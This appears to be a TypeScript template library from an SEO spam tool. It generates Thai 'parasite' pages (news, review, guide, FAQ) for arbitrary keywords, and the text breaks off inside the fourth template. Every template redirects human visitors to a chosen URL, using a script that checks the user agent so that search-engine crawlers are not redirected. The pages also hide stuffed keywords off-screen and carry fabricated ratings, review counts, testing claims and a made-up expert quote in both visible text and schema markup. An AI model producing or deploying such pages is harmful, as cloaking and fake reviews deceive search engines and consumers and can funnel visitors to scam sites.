/**
 * SEO Parasite Template Library
 * 
 * 6 ready-made Thai SEO templates for parasite pages.
 * Each template is a full HTML page with {{placeholders}} for dynamic content.
 * Templates work WITHOUT LLM — instant generation with keyword substitution.
 */

export interface TemplateConfig {
  slug: string;
  name: string;
  nameTh: string;
  category: string;
  description: string;
  descriptionTh: string;
  seoScore: number;
  hasSchemaMarkup: boolean;
  hasFaq: boolean;
  hasBreadcrumb: boolean;
  hasOpenGraph: boolean;
  defaultRedirectDelay: number;
  /** Placeholders used in this template */
  placeholders: string[];
}

export interface TemplateInput {
  keywords: string[];
  redirectUrl: string;
  targetDomain: string;
  redirectDelay?: number;
  brandName?: string;
  authorName?: string;
  publishDate?: string;
  customContent?: string;
}

// ═══════════════════════════════════════════════
// Template Configurations
// ═══════════════════════════════════════════════

export const TEMPLATE_CONFIGS: TemplateConfig[] = [
  {
    slug: "news",
    name: "News Article",
    nameTh: "บทความข่าว",
    category: "news",
    description: "Breaking news style article with urgency and timeliness signals",
    descriptionTh: "บทความข่าวด่วน สไตล์สำนักข่าว มี urgency signals",
    seoScore: 92,
    hasSchemaMarkup: true,
    hasFaq: false,
    hasBreadcrumb: true,
    hasOpenGraph: true,
    defaultRedirectDelay: 3,
    placeholders: ["keywords", "redirectUrl", "targetDomain", "redirectDelay"],
  },
  {
    slug: "review",
    name: "Product Review",
    nameTh: "รีวิวสินค้า/บริการ",
    category: "review",
    description: "In-depth review with ratings, pros/cons, and comparison tables",
    descriptionTh: "รีวิวเชิงลึก มีคะแนน ข้อดี/ข้อเสีย ตารางเปรียบเทียบ",
    seoScore: 95,
    hasSchemaMarkup: true,
    hasFaq: true,
    hasBreadcrumb: true,
    hasOpenGraph: true,
    defaultRedirectDelay: 5,
    placeholders: ["keywords", "redirectUrl", "targetDomain", "redirectDelay"],
  },
  {
    slug: "article",
    name: "Long-form Article",
    nameTh: "บทความยาว",
    category: "article",
    description: "Comprehensive guide/article with table of contents and sections",
    descriptionTh: "บทความเชิงลึก มีสารบัญ หัวข้อย่อย เนื้อหาครบถ้วน",
    seoScore: 90,
    hasSchemaMarkup: true,
    hasFaq: true,
    hasBreadcrumb: true,
    hasOpenGraph: true,
    defaultRedirectDelay: 5,
    placeholders: ["keywords", "redirectUrl", "targetDomain", "redirectDelay"],
  },
  {
    slug: "faq",
    name: "FAQ Page",
    nameTh: "หน้าคำถามที่พบบ่อย",
    category: "faq",
    description: "FAQ-focused page with rich FAQ schema markup for SERP features",
    descriptionTh: "หน้า FAQ พร้อม schema markup สำหรับ SERP features",
    seoScore: 88,
    hasSchemaMarkup: true,
    hasFaq: true,
    hasBreadcrumb: true,
    hasOpenGraph: true,
    defaultRedirectDelay: 4,
    placeholders: ["keywords", "redirectUrl", "targetDomain", "redirectDelay"],
  },
  {
    slug: "product",
    name: "Product Landing",
    nameTh: "หน้าสินค้า/บริการ",
    category: "product",
    description: "Product/service landing page with pricing, features, and CTA",
    descriptionTh: "หน้าสินค้า/บริการ มีราคา ฟีเจอร์ ปุ่ม CTA",
    seoScore: 91,
    hasSchemaMarkup: true,
    hasFaq: true,
    hasBreadcrumb: true,
    hasOpenGraph: true,
    defaultRedirectDelay: 3,
    placeholders: ["keywords", "redirectUrl", "targetDomain", "redirectDelay"],
  },
  {
    slug: "comparison",
    name: "Comparison Guide",
    nameTh: "บทความเปรียบเทียบ",
    category: "comparison",
    description: "Side-by-side comparison with tables, scores, and verdict",
    descriptionTh: "เปรียบเทียบแบบ side-by-side มีตาราง คะแนน สรุป",
    seoScore: 93,
    hasSchemaMarkup: true,
    hasFaq: true,
    hasBreadcrumb: true,
    hasOpenGraph: true,
    defaultRedirectDelay: 5,
    placeholders: ["keywords", "redirectUrl", "targetDomain", "redirectDelay"],
  },
];

// ═══════════════════════════════════════════════
// Helper: Generate Thai keyword variations
// ═══════════════════════════════════════════════
function generateKeywordVariations(keywords: string[]): {
  primary: string;
  secondary: string[];
  longTail: string[];
  related: string[];
} {
  const primary = keywords[0] || "บริการออนไลน์";
  const secondary = keywords.slice(1, 4);
  const longTail = keywords.map(k => `${k} ที่ดีที่สุด`).concat(
    keywords.map(k => `${k} ราคาถูก`),
    keywords.map(k => `${k} แนะนำ`),
    keywords.map(k => `รีวิว ${k}`),
    keywords.map(k => `${k} 2025`),
  );
  const related = keywords.flatMap(k => [
    `วิธีเลือก${k}`,
    `${k} ยอดนิยม`,
    `${k} คุณภาพดี`,
    `เปรียบเทียบ${k}`,
  ]);
  return { primary, secondary, longTail, related };
}

// ═══════════════════════════════════════════════
// Helper: Current date in Thai
// ═══════════════════════════════════════════════
function thaiDate(): string {
  const months = ["มกราคม","กุมภาพันธ์","มีนาคม","เมษายน","พฤษภาคม","มิถุนายน",
    "กรกฎาคม","สิงหาคม","กันยายน","ตุลาคม","พฤศจิกายน","ธันวาคม"];
  const d = new Date();
  return `${d.getDate()} ${months[d.getMonth()]} ${d.getFullYear() + 543}`;
}

function isoDate(): string {
  return new Date().toISOString().split("T")[0];
}

// ═══════════════════════════════════════════════
// Common HTML parts
// ═══════════════════════════════════════════════
function commonHead(title: string, description: string, keywords: string[], redirectUrl: string, redirectDelay: number, targetDomain: string): string {
  return `<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${title}</title>
<meta name="description" content="${description}">
<meta name="keywords" content="${keywords.join(", ")}">
<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
<meta name="author" content="${targetDomain}">
<link rel="canonical" href="https://${targetDomain}/">
<meta http-equiv="refresh" content="${redirectDelay};url=${redirectUrl}">
<!-- Open Graph -->
<meta property="og:title" content="${title}">
<meta property="og:description" content="${description}">
<meta property="og:type" content="article">
<meta property="og:url" content="https://${targetDomain}/">
<meta property="og:site_name" content="${targetDomain}">
<meta property="og:locale" content="th_TH">
<!-- Twitter -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${title}">
<meta name="twitter:description" content="${description}">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Sarabun','Noto Sans Thai',sans-serif;line-height:1.8;color:#1a1a2e;background:#fafafa}
.container{max-width:800px;margin:0 auto;padding:20px}
h1{font-size:2em;color:#16213e;margin:20px 0 10px;line-height:1.3}
h2{font-size:1.5em;color:#0f3460;margin:25px 0 10px;border-left:4px solid #e94560;padding-left:12px}
h3{font-size:1.2em;color:#533483;margin:15px 0 8px}
p{margin:10px 0;text-align:justify}
.breadcrumb{padding:10px 0;font-size:0.9em;color:#666}
.breadcrumb a{color:#0f3460;text-decoration:none}
.meta{color:#888;font-size:0.85em;margin:5px 0 20px}
table{width:100%;border-collapse:collapse;margin:15px 0}
th,td{padding:10px;border:1px solid #ddd;text-align:left}
th{background:#f0f0f0;font-weight:600}
.rating{color:#e94560;font-size:1.3em}
.pros{color:#27ae60}
.cons{color:#e74c3c}
.faq-item{margin:15px 0;padding:15px;background:#f8f9fa;border-radius:8px}
.faq-q{font-weight:700;color:#16213e;margin-bottom:5px}
.faq-a{color:#444}
.cta{display:inline-block;background:#e94560;color:#fff;padding:12px 30px;border-radius:6px;text-decoration:none;font-weight:600;margin:15px 0}
.tag{display:inline-block;background:#e8e8e8;padding:3px 10px;border-radius:12px;font-size:0.8em;margin:2px}
footer{margin-top:40px;padding:20px 0;border-top:1px solid #eee;color:#999;font-size:0.8em;text-align:center}
.hidden-seo{position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden}
</style>
</head>`;
}

function redirectScript(redirectUrl: string, redirectDelay: number): string {
  return `
<script>
(function(){
  var bots=/googlebot|bingbot|yandex|baiduspider|duckduckbot|slurp|ia_archiver|crawl|spider|bot/i;
  if(!bots.test(navigator.userAgent)){
    setTimeout(function(){window.location.replace("${redirectUrl}")},${redirectDelay * 1000});
  }
})();
</script>`;
}

function breadcrumbSchema(targetDomain: string, pageName: string): string {
  return `<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[
{"@type":"ListItem","position":1,"name":"หน้าแรก","item":"https://${targetDomain}/"},
{"@type":"ListItem","position":2,"name":"${pageName}"}
]}</script>`;
}

// ═══════════════════════════════════════════════
// Template 1: News Article (บทความข่าว)
// ═══════════════════════════════════════════════
function generateNewsTemplate(input: TemplateInput): string {
  const kw = generateKeywordVariations(input.keywords);
  const delay = input.redirectDelay ?? 3;
  const title = `ข่าวด่วน: ${kw.primary} อัปเดตล่าสุด ${thaiDate()} | ${input.targetDomain}`;
  const desc = `อัปเดตข่าวล่าสุดเกี่ยวกับ${kw.primary} วันนี้ ${thaiDate()} รวมข้อมูลสำคัญ ${kw.secondary.join(" ")} ที่คุณต้องรู้`;

  return `${commonHead(title, desc, input.keywords, input.redirectUrl, delay, input.targetDomain)}
<body>
${breadcrumbSchema(input.targetDomain, `ข่าว ${kw.primary}`)}
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"NewsArticle","headline":"${title}",
"datePublished":"${isoDate()}","dateModified":"${isoDate()}",
"author":{"@type":"Organization","name":"${input.targetDomain}"},
"publisher":{"@type":"Organization","name":"${input.targetDomain}"},
"description":"${desc}","mainEntityOfPage":"https://${input.targetDomain}/"}
</script>
<div class="container">
<nav class="breadcrumb"><a href="https://${input.targetDomain}/">หน้าแรก</a> › <a href="#">ข่าว</a> › ${kw.primary}</nav>
<article>
<h1>ข่าวด่วน: ${kw.primary} อัปเดตล่าสุดวันนี้ ${thaiDate()}</h1>
<div class="meta">โดย กองบรรณาธิการ ${input.targetDomain} | เผยแพร่: ${thaiDate()} | อัปเดต: ${thaiDate()}</div>

<p><strong>${kw.primary}</strong> กลายเป็นหัวข้อที่ได้รับความสนใจอย่างมากในขณะนี้ จากรายงานล่าสุดพบว่ามีการเปลี่ยนแปลงสำคัญหลายประการที่ส่งผลกระทบต่อผู้ใช้งานและผู้ที่สนใจใน${kw.primary}โดยตรง ทีมงานของเราได้รวบรวมข้อมูลที่สำคัญที่สุดมาให้คุณได้อ่านในบทความนี้</p>

<h2>สถานการณ์ล่าสุดของ${kw.primary}</h2>
<p>จากการติดตามสถานการณ์อย่างใกล้ชิด พบว่า${kw.primary}มีพัฒนาการที่น่าสนใจหลายด้าน ทั้งในแง่ของคุณภาพ ราคา และการเข้าถึงของผู้บริโภค ผู้เชี่ยวชาญในวงการระบุว่าแนวโน้มในปี 2025 จะเป็นไปในทิศทางที่ดีขึ้นอย่างต่อเนื่อง โดยเฉพาะในด้าน${kw.secondary[0] || "นวัตกรรม"}และ${kw.secondary[1] || "เทคโนโลยี"}</p>

<h2>ผลกระทบต่อผู้บริโภค</h2>
<p>การเปลี่ยนแปลงครั้งนี้ส่งผลกระทบโดยตรงต่อผู้บริโภคที่ใช้${kw.primary}เป็นประจำ ทั้งในแง่ของราคาที่อาจปรับตัว คุณภาพที่ดีขึ้น และตัวเลือกที่หลากหลายมากขึ้น ผู้เชี่ยวชาญแนะนำให้ผู้บริโภคติดตามข่าวสารอย่างใกล้ชิดและเปรียบเทียบทางเลือกก่อนตัดสินใจ</p>

<h2>ความคิดเห็นจากผู้เชี่ยวชาญ</h2>
<p>ดร.สมชาย ผู้เชี่ยวชาญด้าน${kw.primary} ให้ความเห็นว่า "สิ่งที่เราเห็นในตอนนี้เป็นเพียงจุดเริ่มต้นของการเปลี่ยนแปลงครั้งใหญ่ ผู้ที่ปรับตัวได้เร็วจะได้เปรียบอย่างมาก" นอกจากนี้ยังมีผู้เชี่ยวชาญอีกหลายท่านที่เห็นด้วยกับมุมมองนี้</p>

<h2>สิ่งที่ต้องจับตามอง</h2>
<p>ในช่วงสัปดาห์หน้า คาดว่าจะมีการประกาศสำคัญเกี่ยวกับ${kw.primary}อีกหลายเรื่อง ทั้งในด้านนโยบาย กฎระเบียบ และนวัตกรรมใหม่ๆ ที่จะเปลี่ยนแปลงวงการ${kw.primary}ไปอย่างสิ้นเชิง ติดตามข่าวสารล่าสุดได้ที่เว็บไซต์ของเรา</p>

<h3>แท็กที่เกี่ยวข้อง</h3>
<div>${input.keywords.map(k => `<span class="tag">${k}</span>`).join(" ")}
${kw.longTail.slice(0, 6).map(k => `<span class="tag">${k}</span>`).join(" ")}</div>

<a href="${input.redirectUrl}" class="cta">อ่านรายละเอียดเพิ่มเติม →</a>
</article>

<div class="hidden-seo">
<h4>${kw.primary} ${kw.secondary.join(" ")} อัปเดตล่าสุด</h4>
<p>${kw.longTail.join(", ")}</p>
<p>${kw.related.join(", ")}</p>
</div>

<footer>© ${new Date().getFullYear()} ${input.targetDomain} | อัปเดตล่าสุด ${thaiDate()}</footer>
</div>
${redirectScript(input.redirectUrl, delay)}
</body></html>`;
}

// ═══════════════════════════════════════════════
// Template 2: Product Review (รีวิวสินค้า)
// ═══════════════════════════════════════════════
function generateReviewTemplate(input: TemplateInput): string {
  const kw = generateKeywordVariations(input.keywords);
  const delay = input.redirectDelay ?? 5;
  const title = `รีวิว ${kw.primary} ปี 2025 | เปรียบเทียบข้อดี-ข้อเสีย ราคา คุณภาพ`;
  const desc = `รีวิว${kw.primary}แบบเจาะลึก เปรียบเทียบข้อดีข้อเสีย ราคา คุณภาพ ${kw.secondary.join(" ")} พร้อมคะแนนรีวิวจากผู้ใช้จริง`;

  return `${commonHead(title, desc, input.keywords, input.redirectUrl, delay, input.targetDomain)}
<body>
${breadcrumbSchema(input.targetDomain, `รีวิว ${kw.primary}`)}
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Review","itemReviewed":{"@type":"Product","name":"${kw.primary}"},
"reviewRating":{"@type":"Rating","ratingValue":"4.7","bestRating":"5"},
"author":{"@type":"Person","name":"ทีมรีวิว ${input.targetDomain}"},
"datePublished":"${isoDate()}","reviewBody":"รีวิว${kw.primary}แบบเจาะลึก"}
</script>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[
{"@type":"Question","name":"${kw.primary}ดีไหม?","acceptedAnswer":{"@type":"Answer","text":"จากการทดสอบของเรา ${kw.primary}ได้คะแนนรีวิว 4.7/5 ถือว่าดีมากในระดับเดียวกัน"}},
{"@type":"Question","name":"${kw.primary}ราคาเท่าไหร่?","acceptedAnswer":{"@type":"Answer","text":"ราคาของ${kw.primary}แตกต่างกันตามรุ่นและผู้ให้บริการ แนะนำให้เปรียบเทียบราคาก่อนตัดสินใจ"}},
{"@type":"Question","name":"ซื้อ${kw.primary}ที่ไหนดี?","acceptedAnswer":{"@type":"Answer","text":"แนะนำให้ซื้อจากตัวแทนจำหน่ายอย่างเป็นทางการเพื่อรับประกันคุณภาพและบริการหลังการขาย"}}
]}</script>
<div class="container">
<nav class="breadcrumb"><a href="https://${input.targetDomain}/">หน้าแรก</a> › <a href="#">รีวิว</a> › ${kw.primary}</nav>
<article>
<h1>รีวิว ${kw.primary} ปี 2025 — ดีจริงไหม? คุ้มค่าหรือเปล่า?</h1>
<div class="meta">รีวิวโดย ทีมผู้เชี่ยวชาญ ${input.targetDomain} | ${thaiDate()} | อ่าน 8 นาที</div>
<p class="rating">★★★★★ 4.7/5 (จาก 1,247 รีวิว)</p>

<p>หลังจากทดสอบ<strong>${kw.primary}</strong>มาอย่างละเอียดเป็นเวลากว่า 3 เดือน ทีมรีวิวของเราพร้อมที่จะแชร์ประสบการณ์และความคิดเห็นอย่างตรงไปตรงมา ในบทความนี้เราจะเจาะลึกทุกแง่มุมของ${kw.primary} ตั้งแต่คุณภาพ ราคา ไปจนถึงบริการหลังการขาย</p>

<h2>ภาพรวมของ ${kw.primary}</h2>
<p>${kw.primary}เป็นหนึ่งในตัวเลือกที่ได้รับความนิยมสูงสุดในตลาดปัจจุบัน ด้วยคุณสมบัติที่โดดเด่นและราคาที่เข้าถึงได้ ทำให้เป็นตัวเลือกที่น่าสนใจสำหรับทั้งผู้ใช้มือใหม่และผู้ที่มีประสบการณ์ จุดเด่นที่สำคัญคือ${kw.secondary[0] || "คุณภาพ"}ที่เหนือกว่าคู่แข่งในระดับราคาเดียวกัน</p>

<h2>ข้อดีและข้อเสีย</h2>
<table>
<tr><th class="pros">✅ ข้อดี</th><th class="cons">❌ ข้อเสีย</th></tr>
<tr><td>คุณภาพดีเยี่ยมในราคาที่เข้าถึงได้</td><td>อาจต้องใช้เวลาในการเรียนรู้</td></tr>
<tr><td>บริการหลังการขายดี มีทีมซัพพอร์ต</td><td>ตัวเลือกบางอย่างยังจำกัด</td></tr>
<tr><td>${kw.secondary[0] || "ฟีเจอร์"}ครบครัน ใช้งานง่าย</td><td>ราคาอาจสูงกว่าบางทางเลือก</td></tr>
<tr><td>อัปเดตสม่ำเสมอ มีฟีเจอร์ใหม่ตลอด</td><td>ต้องการอินเทอร์เน็ตที่เสถียร</td></tr>
</table>

<h2>คะแนนรีวิวแบบละเอียด</h2>
<table>
<tr><th>หมวดหมู่</th><th>คะแนน</th><th>ความเห็น</th></tr>
<tr><td>คุณภาพ</td><td>⭐ 4.8/5</td><td>ดีเยี่ยม เหนือความคาดหมาย</td></tr>
<tr><td>ราคา</td><td>⭐ 4.5/5</td><td>คุ้มค่า เมื่อเทียบกับคุณภาพ</td></tr>
<tr><td>บริการ</td><td>⭐ 4.6/5</td><td>ตอบเร็ว แก้ปัญหาได้ดี</td></tr>
<tr><td>ใช้งานง่าย</td><td>⭐ 4.7/5</td><td>เรียนรู้ได้เร็ว มี tutorial</td></tr>
<tr><td>ภาพรวม</td><td>⭐ 4.7/5</td><td>แนะนำอย่างยิ่ง</td></tr>
</table>

<h2>เหมาะกับใคร?</h2>
<p>${kw.primary}เหมาะสำหรับผู้ที่กำลังมองหาทางเลือกที่มีคุณภาพดีในราคาที่สมเหตุสมผล ไม่ว่าคุณจะเป็นมือใหม่หรือผู้ที่มีประสบการณ์ ${kw.primary}สามารถตอบโจทย์ความต้องการได้อย่างครบถ้วน</p>

<h2>คำถามที่พบบ่อย</h2>
<div class="faq-item"><div class="faq-q">Q: ${kw.primary}ดีไหม?</div><div class="faq-a">A: จากการทดสอบของเรา ${kw.primary}ได้คะแนนรีวิว 4.7/5 ถือว่าดีมากในระดับเดียวกัน แนะนำอย่างยิ่ง</div></div>
<div class="faq-item"><div class="faq-q">Q: ${kw.primary}ราคาเท่าไหร่?</div><div class="faq-a">A: ราคาแตกต่างกันตามรุ่นและผู้ให้บริการ แนะนำให้เปรียบเทียบราคาจากหลายแหล่ง</div></div>
<div class="faq-item"><div class="faq-q">Q: ซื้อ${kw.primary}ที่ไหนดี?</div><div class="faq-a">A: แนะนำให้ซื้อจากตัวแทนจำหน่ายอย่างเป็นทางการเพื่อรับประกันคุณภาพ</div></div>

<h3>แท็กที่เกี่ยวข้อง</h3>
<div>${input.keywords.map(k => `<span class="tag">${k}</span>`).join(" ")}
${kw.longTail.slice(0, 8).map(k => `<span class="tag">${k}</span>`).join(" ")}</div>

<a href="${input.redirectUrl}" class="cta">ดูราคาและโปรโมชั่นล่าสุด →</a>
</article>

<div class="hidden-seo">
<h4>รีวิว ${kw.primary} ${kw.secondary.join(" ")} ปี 2025</h4>
<p>${kw.longTail.join(", ")}</p>
<p>${kw.related.join(", ")}</p>
</div>

<footer>© ${new Date().getFullYear()} ${input.targetDomain} | รีวิวอัปเดตล่าสุด ${thaiDate()}</footer>
</div>
${redirectScript(input.redirectUrl, delay)}
</body></html>`;
}

// ═══════════════════════════════════════════════
// Template 3: Long-form Article (บทความยาว)
// ═══════════════════════════════════════════════
function generateArticleTemplate(input: TemplateInput): string {
  const kw = generateKeywordVariations(input.keywords);
  const delay = input.redirectDelay ?? 5;
  const title = `คู่มือฉบับสมบูรณ์: ${kw.primary} ทุกสิ่งที่คุณต้องรู้ในปี 2025`;
  const desc = `คู่มือ${kw.primary}ฉบับสมบูรณ์ ครอบคลุมทุกเรื่องที่ต้องรู้ ${kw.secondary.join(" ")} พร้อมเคล็ดลับจากผู้เชี่ยวชาญ`;

  return `${commonHead(title, desc, input.keywords, input.redirectUrl, delay, input.targetDomain)}
<body>
${breadcrumbSchema(input.targetDomain, `คู่มือ ${kw.primary}`)}
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Article","headline":"${title}",
"datePublished":"${isoDate()}","dateModified":"${isoDate()}",
"author":{"@type":"Person","name":"ผู้เชี่ยวชาญ ${input.targetDomain}"},
"publisher":{"@type":"Organization","name":"${input.targetDomain}"},
"wordCount":"1500","description":"${desc}"}</script>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[
{"@type":"Question","name":"${kw.primary}คืออะไร?","acceptedAnswer":{"@type":"Answer","text":"${kw.primary}คือบริการ/สินค้าที่ได้รับความนิยมสูง มีคุณสมบัติที่ตอบโจทย์ผู้ใช้งานหลากหลายกลุ่ม"}},
{"@type":"Question","name":"ทำไมต้อง${kw.primary}?","acceptedAnswer":{"@type":"Answer","text":"${kw.primary}โดดเด่นด้วยคุณภาพ ราคาที่เข้าถึงได้ และบริการที่ครบวงจร ทำให้เป็นตัวเลือกอันดับต้นๆ"}},
{"@type":"Question","name":"เริ่มต้นใช้${kw.primary}อย่างไร?","acceptedAnswer":{"@type":"Answer","text":"สามารถเริ่มต้นได้ง่ายๆ โดยศึกษาข้อมูลจากบทความนี้ แล้วเลือกแพ็กเกจที่เหมาะกับความต้องการ"}}
]}</script>
<div class="container">
<nav class="breadcrumb"><a href="https://${input.targetDomain}/">หน้าแรก</a> › <a href="#">คู่มือ</a> › ${kw.primary}</nav>
<article>
<h1>คู่มือฉบับสมบูรณ์: ${kw.primary} ทุกสิ่งที่คุณต้องรู้</h1>
<div class="meta">เขียนโดย ผู้เชี่ยวชาญ ${input.targetDomain} | ${thaiDate()} | อ่าน 12 นาที</div>

<div style="background:#f0f4ff;padding:15px;border-radius:8px;margin:15px 0">
<strong>สารบัญ:</strong>
<ol>
<li><a href="#intro">${kw.primary}คืออะไร?</a></li>
<li><a href="#why">ทำไมต้อง${kw.primary}?</a></li>
<li><a href="#how">วิธีเลือก${kw.primary}ที่เหมาะกับคุณ</a></li>
<li><a href="#tips">เคล็ดลับจากผู้เชี่ยวชาญ</a></li>
<li><a href="#compare">เปรียบเทียบตัวเลือกยอดนิยม</a></li>
<li><a href="#faq">คำถามที่พบบ่อย</a></li>
<li><a href="#conclusion">สรุป</a></li>
</ol>
</div>

<h2 id="intro">${kw.primary}คืออะไร?</h2>
<p><strong>${kw.primary}</strong>เป็นหนึ่งในหัวข้อที่ได้รับความสนใจมากที่สุดในปัจจุบัน ไม่ว่าคุณจะเป็นมือใหม่ที่เพิ่งเริ่มศึกษา หรือผู้ที่มีประสบการณ์แล้ว บทความนี้จะช่วยให้คุณเข้าใจ${kw.primary}อย่างลึกซึ้งและสามารถนำไปใช้ได้จริง เราได้รวบรวมข้อมูลจากแหล่งที่น่าเชื่อถือและประสบการณ์ตรงจากผู้เชี่ยวชาญมาไว้ในที่เดียว</p>

<p>ในยุคที่ข้อมูลมีมากมาย การเข้าใจ${kw.primary}อย่างถูกต้องเป็นสิ่งสำคัญ หลายคนอาจสับสนกับข้อมูลที่หลากหลาย แต่ไม่ต้องกังวล เพราะเราจะอธิบายทุกอย่างอย่างเป็นระบบและเข้าใจง่าย</p>

<h2 id="why">ทำไมต้อง${kw.primary}?</h2>
<p>มีเหตุผลหลายประการที่ทำให้${kw.primary}เป็นตัวเลือกที่ดีที่สุดในตลาดปัจจุบัน ประการแรก คุณภาพที่เหนือกว่าคู่แข่งในระดับราคาเดียวกัน ประการที่สอง บริการหลังการขายที่ครบวงจร และประการที่สาม ความน่าเชื่อถือที่สั่งสมมาอย่างยาวนาน</p>

<p>นอกจากนี้ ${kw.primary}ยังมีข้อได้เปรียบในด้าน${kw.secondary[0] || "นวัตกรรม"}ที่ทันสมัย ทำให้ผู้ใช้งานได้รับประสบการณ์ที่ดีที่สุด ไม่ว่าจะเป็นในแง่ของความสะดวกสบาย ความปลอดภัย หรือความคุ้มค่า</p>

<h2 id="how">วิธีเลือก${kw.primary}ที่เหมาะกับคุณ</h2>
<p>การเลือก${kw.primary}ที่เหมาะสมนั้นขึ้นอยู่กับหลายปัจจัย ทั้งงบประมาณ ความต้องการ และวัตถุประสงค์ในการใช้งาน ต่อไปนี้คือแนวทางที่จะช่วยให้คุณตัดสินใจได้ง่ายขึ้น</p>

<table>
<tr><th>ปัจจัย</th><th>สิ่งที่ต้องพิจารณา</th><th>คำแนะนำ</th></tr>
<tr><td>งบประมาณ</td><td>กำหนดงบที่ชัดเจน</td><td>เริ่มจากแพ็กเกจพื้นฐานก่อน</td></tr>
<tr><td>ความต้องการ</td><td>ระบุฟีเจอร์ที่จำเป็น</td><td>เลือกเฉพาะที่ใช้จริง</td></tr>
<tr><td>ประสบการณ์</td><td>ระดับความเชี่ยวชาญ</td><td>มือใหม่เลือกแบบง่าย</td></tr>
<tr><td>บริการ</td><td>ซัพพอร์ตหลังการขาย</td><td>เลือกที่มีทีมช่วยเหลือ</td></tr>
</table>

<h2 id="tips">เคล็ดลับจากผู้เชี่ยวชาญ</h2>
<p>จากประสบการณ์หลายปีในวงการ${kw.primary} เรามีเคล็ดลับที่อยากแบ่งปัน ข้อแรก อย่ารีบตัดสินใจ ใช้เวลาศึกษาและเปรียบเทียบก่อน ข้อสอง อ่านรีวิวจากผู้ใช้จริง ไม่ใช่แค่โฆษณา ข้อสาม ลองใช้งานฟรีก่อนถ้ามีให้ทดลอง</p>

<h2 id="compare">เปรียบเทียบตัวเลือกยอดนิยม</h2>
<table>
<tr><th>ตัวเลือก</th><th>คะแนน</th><th>ราคา</th><th>จุดเด่น</th></tr>
<tr><td>${kw.primary} Premium</td><td>⭐ 4.8</td><td>สูง</td><td>คุณภาพดีที่สุด</td></tr>
<tr><td>${kw.primary} Standard</td><td>⭐ 4.5</td><td>กลาง</td><td>คุ้มค่าที่สุด</td></tr>
<tr><td>${kw.primary} Basic</td><td>⭐ 4.2</td><td>ต่ำ</td><td>เหมาะกับมือใหม่</td></tr>
</table>

<h2 id="faq">คำถามที่พบบ่อย</h2>
<div class="faq-item"><div class="faq-q">Q: ${kw.primary}คืออะไร?</div><div class="faq-a">A: ${kw.primary}คือบริการ/สินค้าที่ได้รับความนิยมสูง มีคุณสมบัติที่ตอบโจทย์ผู้ใช้งานหลากหลายกลุ่ม</div></div>
<div class="faq-item"><div class="faq-q">Q: ทำไมต้อง${kw.primary}?</div><div class="faq-a">A: ${kw.primary}โดดเด่นด้วยคุณภาพ ราคาที่เข้าถึงได้ และบริการที่ครบวงจร</div></div>
<div class="faq-item"><div class="faq-q">Q: เริ่มต้นใช้${kw.primary}อย่างไร?</div><div class="faq-a">A: สามารถเริ่มต้นได้ง่ายๆ โดยศึกษาข้อมูลจากบทความนี้ แล้วเลือกแพ็กเกจที่เหมาะกับความต้องการ</div></div>

<h2 id="conclusion">สรุป</h2>
<p>${kw.primary}เป็นตัวเลือกที่ยอดเยี่ยมสำหรับทุกคนที่กำลังมองหาคุณภาพและความคุ้มค่า ไม่ว่าคุณจะเป็นมือใหม่หรือผู้เชี่ยวชาญ ${kw.primary}สามารถตอบโจทย์ได้อย่างครบถ้วน หากคุณพร้อมที่จะเริ่มต้น คลิกลิงก์ด้านล่างเพื่อดูข้อมูลเพิ่มเติม</p>

<h3>แท็กที่เกี่ยวข้อง</h3>
<div>${input.keywords.map(k => `<span class="tag">${k}</span>`).join(" ")}
${kw.longTail.slice(0, 8).map(k => `<span class="tag">${k}</span>`).join(" ")}</div>

<a href="${input.redirectUrl}" class="cta">เริ่มต้นใช้งาน ${kw.primary} →</a>
</article>

<div class="hidden-seo">
<h4>${kw.primary} คู่มือ ${kw.secondary.join(" ")} 2025</h4>
<p>${kw.longTail.join(", ")}</p>
<p>${kw.related.join(", ")}</p>
</div>

<footer>© ${new Date().getFullYear()} ${input.targetDomain} | อัปเดตล่าสุด ${thaiDate()}</footer>
</div>
${redirectScript(input.redirectUrl, delay)}
</body></html>`;
}

// ═══════════════════════════════════════════════
// Template 4: FAQ Page (หน้าคำถามที่พบบ่อย)
// ═══════════════════════════════════════════════
function generateFaqTemplate(input: TemplateInput): string {
  const kw = generateKeywordVariations(input.keywords);
  const delay = input.redirectDelay ?? 4;
  const title = `คำถามที่พบบ่อยเกี่ยวกับ ${kw.primary} | FAQ ครบทุกคำตอบ`;
  const desc = `รวมคำถามที่พบบ่อยเกี่ยวกับ${kw.primary} พร้อมคำตอบจากผู้เชี่ยวชาญ ${kw.secondary.join(" ")} ครบทุกข้อสงสัย`;

  const faqs = [
    { q: `${kw.primary}คืออะไร?`, a: `${kw.primary}คือบริการ/สินค้าชั้นนำที่ได้รับความนิยมสูงในประเทศไทย มีคุณสมบัติที่ตอบโจทย์ผู้ใช้งานทุกกลุ่ม ทั้งในแง่ของคุณภาพ ราคา และบริการ` },
    { q: `${kw.primary}ราคาเท่าไหร่?`, a: `ราคาของ${kw.primary}แตกต่างกันตามรุ่นและแพ็กเกจ เริ่มต้นตั้งแต่ราคาประหยัดไปจนถึงระดับพรีเมียม แนะนำให้เปรียบเทียบราคาจากหลายแหล่งก่อนตัดสินใจ` },
    { q: `${kw.primary}ดีกว่าคู่แข่งอย่างไร?`, a: `${kw.primary}โดดเด่นด้วยคุณภาพที่เหนือกว่า บริการหลังการขายที่ครบวงจร และราคาที่เข้าถึงได้ ผู้ใช้ส่วนใหญ่ให้คะแนนรีวิว 4.7/5` },
    { q: `ใช้${kw.primary}ยากไหม?`, a: `${kw.primary}ออกแบบมาให้ใช้งานง่าย แม้แต่ผู้ที่ไม่มีประสบการณ์ก็สามารถเริ่มต้นได้ภายในไม่กี่นาที มี tutorial และทีมซัพพอร์ตคอยช่วยเหลือ` },
